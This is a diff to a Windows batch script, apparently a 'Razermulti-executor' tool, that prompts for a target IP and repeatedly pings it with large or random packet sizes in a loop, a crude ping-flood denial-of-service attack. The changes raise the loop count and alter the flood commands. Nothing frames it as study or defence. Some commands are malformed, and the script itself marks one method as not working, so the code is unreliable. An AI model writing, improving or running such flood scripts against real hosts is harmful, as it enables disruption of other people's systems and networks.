@@ -32,6 +32,7 @@ del %~dp0\Version.txt
 del %~dp0\VersionX.txt
 echo %NewVersion% >> %~dp0\Version.txt
 TITLE Razermulti-executor auto updater - %NewVersion%
+pause >NUL
 exit
 :start
 cls
@@ -159,20 +160,20 @@ ping %web%
 echo copy ip you got here
 set /p target=IP:
 timeout /t 1 > NUL
-echo choose methode "methode1 (working)/ methode2 (not working)"
+echo choose methode "methode1 / methode2 (not working)"
 set /p methode=methode:
 echo processing...
 timeout /t 2 > NUL
 goto %methode%
 set loop=0
 :methode1
-ping %target% -f –t 65500 -w 1 -n 1
+ping %target% -t -l %random% -w 1 -n 1
 echo %target% ms:%random%
 set /a loop=%loop%+1
-if "%loop%"=="100" goto next
+if "%loop%"=="250" goto next
 goto :methode1
 :methode2
-ping %target% -f -l 65535 127.0.0.1
+ping %target% -t -l -f %random% -w 1 -n 1
 echo %target% ms:%random%
 set /a loop=%loop%+1
 if "%loop%"=="100" goto next
